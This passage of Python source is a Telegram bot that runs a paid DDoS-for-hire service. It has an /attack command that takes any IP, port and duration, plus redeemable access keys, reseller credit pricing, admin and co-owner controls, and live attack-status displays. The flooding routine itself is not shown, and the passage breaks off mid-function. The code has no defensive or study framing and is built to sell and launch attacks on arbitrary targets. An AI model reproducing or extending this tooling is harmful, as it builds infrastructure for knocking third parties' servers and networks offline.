        f"╔══════════════════════════╗\n"
        f"║ 👋 Welcome to the DDoS World! 🔎\n"
        f"╚══════════════════════════╝\n"
        f"┌─────────────────────────┐\n"
        f"│ 🆔 User ID: `{user_id}`\n"
        f"│ 👤 Userame: @{username}\n"
        f"├─────────────────────────\n"
        f"│ 💡 TIPS:\n"
        f"├─• Each attack can last up to 300s\n"
        f"├─• Redeem key with /redeem [key]\n"
        f"└─────────────────────────┘"
    )
    
    if str(user_id) == OWNER_ID:
        welcome += "👑 Owner Access | ⚡ Unlimited\n\n"
    elif is_co_owner(user_id):
        welcome += "👑 Co-Owner Access | ⚡ Unlimited\n\n"
    elif is_reseller(user_id):
        welcome += "💎 Reseller Access | ⚡ Attack Enabled\n\n"
    elif is_user_allowed(user_id)[0]:
        welcome += "✅ Active Plan\n\n"
    else:
        welcome += "❌ No Active Plan\n\n"
    
    welcome += "🔹 /redeem (key) to activate plan\n🔹 /help for show commands"
    
    bot.reply_to(message, welcome, parse_mode="Markdown")

# ═══════════════════════════════════════════════════
# 📌 HELP COMMAND
# ═══════════════════════════════════════════════════
@bot.message_handler(commands=['help'])
def help_cmd(message):
    user_id = str(message.from_user.id)
    is_res = is_reseller(user_id)
    is_own = is_admin(int(user_id))
    
    help_text = (
        "╔═══════════════════════╗\n"
        "║  🤖 Command Center Hub 📢\n"
        "╚═══════════════════════╝\n"
        "┌─────────────────────────┐"
        "│ *📌 Basic Commands*\n"
        "├─────────────────────────\n"
        "│ /start - Start bot\n"
        "│ /help - This menu\n"
        "│ /id - Get your user ID\n"
        "│ /redeem KEY - Activate key\n"
        "│ /attack IP PORT TIME - Launch attack\n"
        "│ /status - View attack status\n"
        "└─────────────────────────┘\n"
    )
    
    if is_own:
        help_text += (
            "┌─────────────────────────┐\n"
            "│ \n*👑 ADMIN COMMANDS*\n"
            "└─────────────────────────┘\n"
            "┌───────────────────────────────────┐\n"
            "│ /genadmin PREFIX DUR UNIT COUNT - Gen keys\n"
            "│ /genadvkey PREFIX DUR UNIT COUNT MAX - Multi-use keys\n"
            "│ /gentrial PREFIX DUR UNIT COUNT [MAX] - Gen trial keys\n"
            "│ /deletetrialkeys - Delete all trial keys\n"
            "│ /allkeys - View all keys\n"
            "│ /removekey KEY - Delete key\n"
            "│ /keyinfo KEY - Key details\n"
            "│ /inkey KEY AMT - Increase key\n"
            "│ /removeinkey KEY AMT - Decrease key\n"
            "│ /inallkey AMT - Increase all\n"
            "│ /allremoveinkey AMT - Decrease all\n"
            "├─────────────────────────┐\n"
            "│\n*👑 USER MANAGEMENT*\n"
            "├─────────────────────────┘\n"
            "├───────────────────────────────────\n"
            "│ /users - List users\n"
            "│ /removeuser ID - Delete user\n"
            "│ /removeuserkey ID - Remove key\n"
            "│ /extenduser ID DAYS - Extend plan\n"
            "│ /extendusers DUR UNIT - Extend ALL users\n"
            "│ /ban ID REASON - Ban user\n"
            "│ /unban ID - Unban user\n"
            "│ /bannedlist - Banned users\n"
            "├─────────────────────────┐\n"
            "│\n*👑 RESELLER MANAGEMENT*\n"
            "├─────────────────────────┘\n"
            "├───────────────────────────────────\n"
            "│ /addreseller ID - Add reseller\n"
            "│ /removereseller ID - Remove reseller\n"
            "│ /remove\\_reseller\\_balance ID - Reset balance\n"
            "│ /resellers - List resellers\n"
            "│ /addbalance ID AMT - Add balance\n"
            "├─────────────────────────┐\n"
            "│\n*👑 CO-OWNER*\n"
            "├─────────────────────────┘\n"
            "├───────────────────────────────────\n"
            "│ /addcoowner ID - Add co-owner\n"
            "│ /removecoowner ID - Remove co-owner\n"
            "│ /coowners - List co-owners\n"
            "├─────────────────────────┐\n"
            "│\n*👑 SYSTEM*\n"
            "├─────────────────────────┘\n"
            "├───────────────────────────────────\n"
            "│ /setlimit MAX DUR COOLDOWN - Limits\n"
            "│ /broadcast MSG - Broadcast\n"
            "│ /stats - Statistics\n"
            "│ /systeminfo - System info\n"
            "│ /logs - Attack logs\n"
            "│ /clearlogs - Clear logs\n"
            "└───────────────────────────────────┘\n"
        ) 
    
    if is_res and not is_own:
        help_text += (
            "┌────────────────────────┐\n"
            "│ \n*💰 RESELLER COMMANDS*\n"
            "└────────────────────────┘\n"
            "┌───────────────────────────────┐\n"
            "│ 🔹 *KEY GENERATION*\n"
            "├───────────────────────────────\n"
            "│ 🔸 /genkey TYPE COUNT - Generate keys\n"
            "│ 🔸 Example: `/genkey 7d 5`\n"
            "├───────────────────────────────\n"
            "│ 🔹 *BALANCE & KEYS*\n"
            "├───────────────────────────────\n"
            "│ 🔸 /balance - Check your credit balance\n"
            "│ 🔸 /mykeys - View your unused keys\n"
            "│ 🔸 /reseller\\_panel - Full reseller dashboard\n"
            "├───────────────────────────────\n"
            "│ 🔹 *AVAILABLE KEY TYPES*\n"
            "├───────────────────────────────\n"
            "│ `12h` `24h` `1d` to `30d`\n"
            "├───────────────────────────────\n"
            "│🔹 *PRICING*\n"
            "├───────────────────────────────\n"
            "│ • 12h = 50 credits\n"
            "│ • 1 Day = 100 credits\n"
            "│ • 30 Days = 3000 credits\n"
            "├───────────────────────────────\n"
            "│🔹 *ATTACK ACCESS*\n"
            "├───────────────────────────────\n"
            "│ ⚡ You can attack WITHOUT a plan!\n"
            "│ 📊 Cooldown & limits still apply\n"
            "├───────────────────────────────\n"
            "│ 🔹 *NEED BALANCE?*\n"
            "├───────────────────────────────\n"
            "│💬 Contact admin for balance topup\n"
            "└───────────────────────────────┘"
        )
    
    if not is_res and not is_own:
        help_text += (
            "┌────────────────────┐\n"
            "│ \n*📌 Normal User*\n"
            "└────────────────────┘\n"
            "┌─────────────────────────┐\n"
            "│ 🔑 Redeem a key to get started!\n"
            "│ 💬 Contact seller for key purchase\n"
            "└─────────────────────────┘"
        )
    
    bot.reply_to(message, help_text, parse_mode="Markdown")

# ═══════════════════════════════════════════════════
# 📌 ID COMMAND
# ═══════════════════════════════════════════════════
@bot.message_handler(commands=['id'])
def id_cmd(message):
    bot.reply_to(message, f"🆔 *Your User ID*: `{message.from_user.id}`", parse_mode="Markdown")

# ═══════════════════════════════════════════════════
# 📌 STATUS COMMAND
# ═══════════════════════════════════════════════════
@bot.message_handler(commands=['status'])
def status_cmd(message):
    user_id = message.from_user.id
    
    if str(user_id) != OWNER_ID and not is_co_owner(user_id) and not is_reseller(user_id):
        allowed, _ = is_user_allowed(user_id)
        if not allowed:
            bot.reply_to(message,
                "╔══════════════════════╗\n"
                "║  🚫 *Access Denied!* 🚫\n"
                "╚══════════════════════╝\n\n"
                "┌─────────────────────────┐\n"
                "│ ❌ You are not authorized\n"
                "│ 🔑 Use /redeem (key) to activate\n"
                "└─────────────────────────┘",
                parse_mode="Markdown")
            return
    
    attacks = active_attacks
    cooldown_remaining = max(0, int(user_cooldowns.get(user_id, 0) - time.time())) if user_id in user_cooldowns else 0
    
    status_msg = (
        f"╔══════════════════════╗\n"
        f"║     🔥 *Attack Status!* 🔥\n"
        f"╚══════════════════════╝\n\n"
        f"┌─────────────────────────┐\n"
        f"│ 📊 Slots: {len(attacks)}/{MAX_CONCURRENT_ATTACKS} used\n"
        f"│ 🆓 Available: {MAX_CONCURRENT_ATTACKS - len(attacks)} slots\n"
        f"└─────────────────────────┘\n\n"
    )
    
    if attacks:
        status_msg += "┌─────────────────────────┐\n│ ★━━━•⚠️ *Active Attacks* ⚠️•━━━★\n"
        for uid, attack in list(attacks.items())[:10]:
            elapsed = int(time.time() - attack["start_time"])
            remaining = max(0, attack["duration"] - elapsed)
            progress = int((elapsed / attack["duration"]) * 100) if attack["duration"] > 0 else 0
            bar = generate_progress_bar(progress)
            status_msg += f"├─────────────────────────\n│ 🎯 {attack['target']}:{attack['port']}\n⏱️ {format_time(remaining)} left\n[{bar}] {progress}%\n└─────────────────────────┘\n\n"
    else:
        status_msg += "├─────────────────────────\n│ 💤 No active attacks....\n└─────────────────────────┘\n\n"
    
    status_msg += "┌─────────────────────────┐\n│ ★━━━•👤 *Your Status* 👤•━━━★\n"
    if cooldown_remaining > 0:
        status_msg += f"├─────────────────────────\n│ ⏳ Cooldown: {format_time(cooldown_remaining)}\n└─────────────────────────┘"
    else:
        status_msg += "├─────────────────────────\n│ ✅ Ready to attack....\n└─────────────────────────┘\n"
    
    msg = bot.reply_to(message, status_msg, parse_mode="Markdown")
    
    if attacks or cooldown_remaining > 0:
        threading.Thread(target=update_status_live, args=(message.chat.id, user_id, msg.message_id), daemon=True).start()

# ═══════════════════════════════════════════════════
# 📌 ATTACK COMMAND
# ═══════════════════════════════════════════════════
@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message,
            "╔═════════════════════════╗\n"
            "║  ❌ *Invalid Format Usage!!* ❌\n"
            "╚═════════════════════════╝\n"
            "┌─────────────────────────┐\n"
            "├─• 🔸 /attack ip port duration\n"
            "├─• 💡 Example: /attack 1.1.1.1 8080 60\n"
            "├─• ⏱️ Min: 10s | Max: {MAX_ATTACK_DURATION}s\n"
            "└─────────────────────────┘",
            parse_mode="Markdown")
        return
    
    target = args[1]
    port = args[2]
    duration = args[3]
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ Port must be 1-65535", parse_mode="Markdown")
            return
    except:
        bot.reply_to(message, "❌ This is invalid port", parse_mode="Markdown")
        return
    
    try:
        duration = int(duration)
        if duration < 10:
            bot.reply_to(message, "❌ Minimum 10 seconds work", parse_mode="Markdown")
            return
    except:
        bot.reply_to(message, "❌ This is invalid duration", parse_mode="Markdown")
        return
    
    start_attack(message.chat.id, user_id, target, port, duration, username)

# ═══════════════════════════════════════════════════
# 📌 REDEEM COMMAND
# ═══════════════════════════════════════════════════
@bot.message_handler(commands=['redeem'])
def redeem_cmd(message):
    if message.chat.type in ["group", "supergroup"]:
        bot.reply_to(message, "📍 • /redeem (key) command working only private chat", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message,
            "╔══════════════════════╗\n"
            "║    ❌ *Invalid Format!* ❌\n"
            "╚══════════════════════╝\n"
            "┌─────────────────────────┐\n"
            "├─•🔸 /redeem (key)\n"
            "├─•🔸 /redeem XXXX-XXXX-XXXX\n"
            "└─────────────────────────┘\n",
            parse_mode="Markdown")
        return
    
    key = args[1]
    result, expiry = redeem_key(message.from_user.id, key)
    
    if result == "invalid":
        bot.reply_to(message, "❌ This is invalid key", parse_mode="Markdown")
    elif result == "used":
        bot.reply_to(message, "❌ This key already used", parse_mode="Markdown")
    elif result == "already_active":
        bot.reply_to(message, "❌ You already have an active plan", parse_mode="Markdown")
    elif result == "trial_already_used":
        bot.reply_to(message, "❌ You have already used a trial key!", parse_mode="Markdown")
    elif result == "success":
        remaining = expiry - datetime.datetime.now()
        days = remaining.days
        hours = remaining.seconds // 3600
        minutes = (remaining.seconds % 3600) // 60
        bot.reply_to(message,
            f"╔═══════════════════╗\n"
            f"║   ✅ *Key Activated!* ✅\n"
            f"╚═══════════════════╝\n"
            f"┌─────────────────────────┐\n"
            f"│ 📅 {days}-D{hours}-H {minutes}-M\n"
            f"│ ⏰ Expires: {expiry.strftime('%Y-%m-%d %H:%M')} IST\n"
            f"└─────────────────────────┘",
            parse_mode="Markdown")

# ═══════════════════════════════════════════════════
# 📌 RESELLER COMMANDS
# ═══════════════════════════════════════════════════
@bot.message_handler(commands=['balance'])
def balance_cmd(message):
    if message.chat.type in ["group", "supergroup"]:
        bot.reply_to(message, "❌ • /balance command working only private chat", parse_mode="Markdown")
        return
    
    user_id = str(message.from_user.id)
    if not is_reseller(user_id) and not is_admin(int(user_id)):
        bot.reply_to(message, "❌ You are not a official reseller", parse_mode="Markdown")
        return
    
    bot.reply_to(message, f"💰 Total Balance: {get_balance(user_id)} credits", parse_mode="Markdown")

@bot.message_handler(commands=['genkey'])
def genkey_cmd(message):
    if message.chat.type in ["group", "supergroup"]:
        bot.reply_to(message, "❌ • /genkey command working only private chat", parse_mode="Markdown")
        return
    
    user_id = str(message.from_user.id)
    if not is_reseller(user_id) and not is_admin(int(user_id)):
        bot.reply_to(message, "❌ You are not a official reseller", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message,
            "╔═══════════════════╗\n"
            "║   ❌ *Invalid Format!* ❌\n"
            "╚═══════════════════╝\n"
            "┌─────────────────────────┐\n"
            "├─•🔸 /genkey Type Count\n"
            "├─•✅ Types: 12h, 24h, 1d to 30d\n"
            "└─────────────────────────┘",
            parse_mode="Markdown")
        return
    
    key_type = args[1].lower()
    try:
        count = int(args[2])
        if count < 1 or count > 50:
            bot.reply_to(message, "❌ Keys count must be 1-50", parse_mode="Markdown")
            return
    except:
        bot.reply_to(message, "❌ This is invalid count", parse_mode="Markdown")
        return
    
    if key_type not in RESELLER_KEY_OPTIONS:
        bot.reply_to(message, "❌ This is Invalid type......\n\n✅ 12h, 24h, 1d to 30d", parse_mode="Markdown")
        return
    
    option = RESELLER_KEY_OPTIONS[key_type]
    cost = option["credits"] * count
    
    if not is_admin(int(user_id)) and get_balance(user_id) < cost:
        bot.reply_to(message, f"❌ Insufficient balance your account\n\n🔎 Need: {cost} | Have: {get_balance(user_id)}", parse_mode="Markdown")
        return
    
    keys, error = generate_keys_reseller(user_id, key_type, count)
    if error:
        bot.reply_to(message, error, parse_mode="Markdown")
        return
    
    keys_text = "\n".join([f"`{k}`" for k in keys])
    bot.reply_to(message,
        f"╔═════════════════════╗\n"
        f"║   ✅ *Keys Generated!* ✅\n"
        f"╚═════════════════════╝\n"
        f"┌─────────────────────────┐\n"
        f"│ 📦 {count} keys\n"
        f"│ ⏱️ Duration: {option['name']}\n"
        f"│ 💎 Cost: {cost} credits\n"
        f"│ 💰 Balance: {get_balance(user_id)}\n"
        f"├─────────────────────────\n"
        f"│ • {keys_text}\n"
        f"└─────────────────────────┘",
        parse_mode="Markdown")

@bot.message_handler(commands=['mykeys'])
def mykeys_cmd(message):
    if message.chat.type in ["group", "supergroup"]:
        bot.reply_to(message, "❌ • /mykeys command working only private chat", parse_mode="Markdown")
        return
    
    user_id = str(message.from_user.id)
    if not is_reseller(user_id) and not is_admin(int(user_id)):
        bot.reply_to(message, "❌ You are not a official reseller", parse_mode="Markdown")
        return
    
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    my_keys = [k for k, v in keys_data["unused"].items() if v.get("generated_by") == user_id]
    
    if not my_keys:
        bot.reply_to(message, "📦 No keys found.....", parse_mode="Markdown")
        return
    
    msg = (
        "╔════════════════════╗\n"
        "║    🔑 *My All Keys!* 🔑\n"
        "╚════════════════════╝\n"
        f"┌─────────────────────────┐\n"
        f"│ 📦 Total keys: {len(my_keys)}\n"
        f"└─────────────────────────┘"
    )
    
    for k in my_keys[:20]:
        info = keys_data["unused"][k]
        hours = info['duration']
        display = f"{hours//24} day(s)" if hours >= 24 else f"{hours} hours"
        msg += f"`{k}`\n  👥 {info.get('redeemed_count', 0)}/{info.get('max_users', 1)} | ⏱️ {display}\n\n"
    
    if len(my_keys) > 20:
        msg += f"... and {len(my_keys) - 20} more"
    
    bot.reply_to(message, msg[:4000], parse_mode="Markdown")

@bot.message_handler(commands=['reseller_panel'])
def reseller_panel_cmd(message):
    if message.chat.type in ["group", "supergroup"]:
        bot.reply_to(message, "❌ This command working only private chat", parse_mode="Markdown")
        return
    
    user_id = str(message.from_user.id)
    if not is_reseller(user_id) and not is_admin(int(user_id)):
        bot.reply_to(message, "❌ Reseller access required for use this command", parse_mode="Markdown")
        return
    
    balance = get_balance(user_id)
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    my_keys = [k for k, v in keys_data["unused"].items() if v.get("generated_by") == user_id]
    total_used = sum(info.get("redeemed_count", 0) for k in my_keys for info in [keys_data["unused"][k]])
    total_users = sum(info.get("max_users", 1) for k in my_keys for info in [keys_data["unused"][k]])
    
    msg = (
        "╔═══════════════════════╗\n"
        "║  💰 *Reseller Information!* 💰\n"
        "╚═══════════════════════╝\n"
        f"┌─────────────────────────┐\n"
        f"│ 💰 Balance: {balance} credits\n"
        f"│ 🔑 Keys: {len(my_keys)}\n"
        f"│ 👥 Used: {total_used}/{total_users}\n"
        f"│ ⚡ Attack: Enabled\n"
        f"└─────────────────────────┘\n\n"
        "━━━💰 Pricing 💰━━━\n\n"
    )
    
    for ktype, info in RESELLER_KEY_OPTIONS.items():
        msg += f"• {info['name']}: {info['credits']} credits\n"
    
    msg += "\n❌ Usage: /genkey <Type> <Count> to generate"
    bot.reply_to(message, msg, parse_mode="Markdown")

# ═══════════════════════════════════════════════════
# 📌 CO-OWNER COMMANDS
# ═══════════════════════════════════════════════════
@bot.message_handler(commands=['addcoowner'])
def addcoowner_cmd(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ OWNER ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/addcoowner USER\\_ID", parse_mode="Markdown")
        return
    
    co_owners = load_co_owners()
    if args[1] not in co_owners:
        co_owners.append(args[1])
        save_co_owners(co_owners)
        try:
            bot.send_message(args[1], "╔══════════════════════════════╗\n║     👑 CO-OWNER ACCESS      ║\n╚══════════════════════════════╝\n\n✅ Full access granted", parse_mode="Markdown")
        except:
            pass
        bot.reply_to(message, f"╔══════════════════════════════╗\n║   ✅ CO-OWNER ADDED        ║\n╚══════════════════════════════╝\n\n🆔 `{args[1]}`\n👑 Full access granted", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Already co-owner", parse_mode="Markdown")

@bot.message_handler(commands=['removecoowner'])
def removecoowner_cmd(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ OWNER ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/removecoowner USER\\_ID", parse_mode="Markdown")
        return
    
    co_owners = load_co_owners()
    if args[1] in co_owners:
        co_owners.remove(args[1])
        save_co_owners(co_owners)
        try:
            bot.send_message(args[1], "╔══════════════════════════════╗\n║    ⚠️ ACCESS REVOKED        ║\n╚══════════════════════════════╝\n\nCo-owner privileges removed", parse_mode="Markdown")
        except:
            pass
        bot.reply_to(message, f"╔══════════════════════════════╗\n║  ✅ CO-OWNER REMOVED       ║\n╚══════════════════════════════╝\n\n🆔 `{args[1]}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Not co-owner", parse_mode="Markdown")

@bot.message_handler(commands=['coowners'])
def coowners_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    co_owners = load_co_owners()
    if not co_owners:
        bot.reply_to(message, "📦 No co-owners", parse_mode="Markdown")
        return
    
    msg = "╔══════════════════════════════╗\n║    👑 CO-OWNERS LIST       ║\n╚══════════════════════════════╝\n\n"
    for uid in co_owners:
        msg += f"• `{uid}`\n"
    
    bot.reply_to(message, msg, parse_mode="Markdown")

# ═══════════════════════════════════════════════════
# 📌 ADMIN KEY COMMANDS
# ═══════════════════════════════════════════════════
@bot.message_handler(commands=['genadmin'])
def genadmin_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message,
             "╔═══════════════════════\n"
             "║   ❌ Admin Only Use This! ❌\n"
             "╚═══════════════════════", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 5:
        bot.reply_to(message,
            "╔══════════════════════╗\n"
            "║    ❌ *Invalid Format!* ❌\n"
            "╚══════════════════════╝\n"
            "┌──────────────────────────────┐\n"
            "├─•🔸 /genadmin PREFIX DUR UNIT COUNT\n"
            "├─•🔸 Example: /genadmin VIP 7 day 10\n"
            "├─•🔸 Units: min, hour, day\n"
            "└──────────────────────────────┘",
            parse_mode="Markdown")
        return
    
    prefix = args[1]
    dur = int(args[2])
    unit = args[3].lower()
    count = int(args[4])
    
    if unit not in ["min", "hour", "day"]:
        bot.reply_to(message, "❌ Unit: min, hour, day", parse_mode="Markdown")
        return
    
    keys = generate_keys_admin(prefix, dur, unit, count)
    keys_text = "\n".join([f"`{k}`" for k in keys])
    
    bot.reply_to(message,
        f"╔══════════════════════╗\n"
        f"║   ✅ *Keys Generated!* ✅\n"
        f"╚══════════════════════╝\n"
        f"┌─────────────────────────┐\n"
        f"│ 📦 {count} keys\n"
        f"│ ⏱️ {dur}{unit}\n"
        f"├─────────────────────────\n"
        f"│ {keys_text}\n"
        f"└─────────────────────────┘",
        parse_mode="Markdown")

@bot.message_handler(commands=['genadvkey'])
def genadvkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 6:
        bot.reply_to(message,
            "╔══════════════════════════════╗\n"
            "║    ❌ INVALID USAGE         ║\n"
            "╚══════════════════════════════╝\n\n"
            "/genadvkey PREFIX DUR UNIT COUNT MAX\\_USERS",
            parse_mode="Markdown")
        return
    
    prefix = args[1]
    dur = int(args[2])
    unit = args[3].lower()
    count = int(args[4])
    max_users = int(args[5])
    
    if unit not in ["min", "hour", "day"]:
        bot.reply_to(message, "❌ Unit: min, hour, day", parse_mode="Markdown")
        return
    
    keys = generate_keys_admin(prefix, dur, unit, count, max_users)
    keys_text = "\n".join([f"`{k}`" for k in keys])
    
    bot.reply_to(message,
        f"╔══════════════════════╗\n"
        f"║   ✅ *Keys Generated!* ✅\n"
        f"╚══════════════════════╝\n"
        f"┌─────────────────────────┐\n"
        f"│ 📦 {count} keys\n"
        f"│ 👥 Max {max_users} users each\n"
        f"│ ⏱️ {dur}{unit}\n"
        f"├─────────────────────────\n"
        f"│ {keys_text}\n"
        f"└─────────────────────────┘",
        parse_mode="Markdown")

@bot.message_handler(commands=['gentrial'])
def gentrial_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) < 5:
        bot.reply_to(message,
            "╔══════════════════════════════╗\n"
            "║    ❌ INVALID USAGE         ║\n"
            "╚══════════════════════════════╝\n\n"
            "/gentrial PREFIX DUR UNIT COUNT [MAX_USERS]\n"
            "Example: /gentrial TEST 1 hour 5 1\n"
            "Units: min, hour, day",
            parse_mode="Markdown")
        return
    
    prefix = args[1]
    dur = int(args[2])
    unit = args[3].lower()
    count = int(args[4])
    max_users = int(args[5]) if len(args) > 5 else 1
    
    if unit not in ["min", "hour", "day"]:
        bot.reply_to(message, "❌ Unit: min, hour, day", parse_mode="Markdown")
        return
    
    keys = generate_trial_keys_admin(prefix, dur, unit, count, max_users)
    keys_text = "\n".join([f"`{k}`" for k in keys])
    
    bot.reply_to(message,
        f"╔═══════════════════════╗\n"
        f"║   ✅ *Trial Keys Generated!* \n"
        f"╚═══════════════════════╝\n"
        f"┌─────────────────────────┐\n"
        f"│ 📦 {count} trial keys\n"
        f"│ ⏱️ {dur}{unit}\n"
        f"│ 👥 Max users per key: {max_users}\n"
        f"│ ⚠️ One trial per user!\n"
        f"├─────────────────────────\n"
        f"│ {keys_text}\n"
        f"└─────────────────────────┘",
        parse_mode="Markdown")

@bot.message_handler(commands=['deletetrialkeys'])
def deletetrialkeys_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    delete_all_trial_keys()
    bot.reply_to(message,
        "╔═══════════════════════╗\n"
        "║  ✅ ALL TRIAL KEYS DELETED\n"
        "╚═══════════════════════╝",
        parse_mode="Markdown")

@bot.message_handler(commands=['allkeys'])
def allkeys_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    msg = "🔑 ALL KEYS:\n\n🟢 UNUSED:\n"
    if keys_data.get("unused"):
        for key, info in list(keys_data["unused"].items())[:20]:
            msg += f"• `{key}`\n  ⏱️ {info['duration']}{info['unit']} | 👥 {info.get('redeemed_count', 0)}/{info.get('max_users', 1)}\n\n"
    else:
        msg += "None\n\n"
    
    msg += "🔴 USED:\n"
    if keys_data.get("used"):
        for key, info in list(keys_data["used"].items())[:20]:
            user_id = info.get("used_by", "Unknown")
            msg += f"• `{key}`\n  👤 `{user_id}` | ⏱️ {info['duration']}{info['unit']}\n\n"
    else:
        msg += "None\n"
    
    bot.reply_to(message, msg[:4000], parse_mode="Markdown")

@bot.message_handler(commands=['removekey'])
def removekey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/removekey KEY", parse_mode="Markdown")
        return
    
    key = args[1]
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    if key in keys_data.get("unused", {}):
        del keys_data["unused"][key]
        save_json(KEYS_FILE, keys_data)
        bot.reply_to(message, "✅ Key removed (unused)", parse_mode="Markdown")
    elif key in keys_data.get("used", {}):
        user_id = keys_data["used"][key].get("used_by")
        if user_id:
            users = load_json(USER_FILE, {})
            if str(user_id) in users:
                del users[str(user_id)]
                save_json(USER_FILE, users)
        del keys_data["used"][key]
        save_json(KEYS_FILE, keys_data)
        bot.reply_to(message, f"✅ Key removed | User `{user_id}` revoked", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Key not found", parse_mode="Markdown")

@bot.message_handler(commands=['keyinfo'])
def keyinfo_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/keyinfo KEY", parse_mode="Markdown")
        return
    
    key = args[1]
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    if key in keys_data.get("unused", {}):
        info = keys_data["unused"][key]
        msg = (
            f"╔══════════════════════════════╗\n"
            f"║    🔑 KEY INFORMATION        ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"*Key:* `{key}`\n"
            f"*Status:* 🟢 UNUSED\n"
            f"*Duration:* {info['duration']}{info['unit']}\n"
            f"*Max Users:* {info.get('max_users', 1)}\n"
            f"*Redeemed:* {info.get('redeemed_count', 0)}/{info.get('max_users', 1)}"
        )
        bot.reply_to(message, msg, parse_mode="Markdown")
    elif key in keys_data.get("used", {}):
        info = keys_data["used"][key]
        msg = (
            f"╔══════════════════════════════╗\n"
            f"║    🔑 KEY INFORMATION        ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"*Key:* `{key}`\n"
            f"*Status:* 🔴 USED\n"
            f"*Duration:* {info['duration']}{info['unit']}\n"
            f"*Used By:* `{info.get('used_by', 'Unknown')}`\n"
            f"*Expires:* {info.get('expiry', 'Unknown')}"
        )
        bot.reply_to(message, msg, parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Key not found", parse_mode="Markdown")

@bot.message_handler(commands=['inkey'])
def inkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/inkey KEY AMOUNT", parse_mode="Markdown")
        return
    
    key = args[1]
    amount = int(args[2])
    
    success, status = increase_key_duration(key, amount)
    if success:
        bot.reply_to(message, f"✅ Key +{amount} [{status}]", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Key not found", parse_mode="Markdown")

@bot.message_handler(commands=['removeinkey'])
def removeinkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/removeinkey KEY AMOUNT", parse_mode="Markdown")
        return
    
    key = args[1]
    amount = int(args[2])
    
    success, status = decrease_key_duration(key, amount)
    if success:
        bot.reply_to(message, f"✅ Key -{amount} [{status}]", parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ Key not found", parse_mode="Markdown")

@bot.message_handler(commands=['inallkey'])
def inallkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="Markdown")
        return
    
    args = message.text.split()
    if len(args) != 2:
